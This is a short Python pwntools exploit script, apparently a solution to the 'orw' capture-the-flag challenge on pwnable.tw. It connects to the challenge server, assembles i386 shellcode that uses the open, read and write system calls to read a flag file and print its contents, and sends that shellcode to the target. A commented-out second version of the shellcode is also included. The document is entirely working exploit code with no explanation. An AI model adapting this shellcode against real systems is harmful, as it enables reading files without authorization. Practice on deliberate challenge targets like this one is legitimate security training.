from pwn import *
context(arch='i386',log_level='debug')
conn=process("./orw")
conn=remote("chall.pwnable.tw",10001)
shellcode="""
		mov eax,5
		call getstr
		.ascii "./flag"
		.byte 0
	getstr:
		pop ebx
		mov ecx,0
		mov edx,0
		int 0x80
	read:
		mov eax,3
		mov ebx,3
		mov ecx,0x0804a100
		mov edx,40
		int 0x80

	write:
		mov eax,4
		mov ebx,1
		mov edx,40
		mov ecx,0x0804a100
		int 0x80

"""
# shellcode="""
# 	mov eax,2
# 	call open_ebx
# 	.ascii "/home/orw/flag"
#     .byte 0
# open_ebx:
# 	pop ebx
# 	mov eax,5
# 	mov ecx,0
# 	int 0x80 #open("/home/orw/flag","r+");
# 	mov eax,3
# 	mov ebx,3
# 	mov ecx,0x0804a800
# 	mov edx,40
# 	int 0x80 #read(3,buf,40)
# 	mov eax,4
# 	mov ebx,1
# 	mov ecx,0x0804a800
# 	mov edx,40
# 	int 0x80 #write(1,buf,40)
# """
shellcode=asm(shellcode)
conn.recv()
conn.send(shellcode)
print conn.recv()